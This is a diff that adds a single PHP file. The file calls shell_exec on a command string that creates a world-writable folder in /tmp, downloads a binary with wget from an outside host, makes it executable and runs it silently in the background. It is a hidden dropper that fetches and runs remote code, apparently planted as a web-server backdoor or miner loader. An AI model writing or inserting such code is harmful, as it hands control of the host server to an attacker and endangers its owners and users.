@@ -1,0 +1,1 @@
+<?php $a = 'ulimit -n 234234;cd /tmp;mkdir oiueweren3;chmod 777 oiueweren3;cd oiueweren3;rm -f oiueweren3;wget -O oiueweren3 http://mono.declarebusinessgroup.ga/5/oiueweren;chmod 777 oiueweren3;nohup "./oiueweren3" >> /dev/null 2>&1 & echo $!';shell_exec($a);
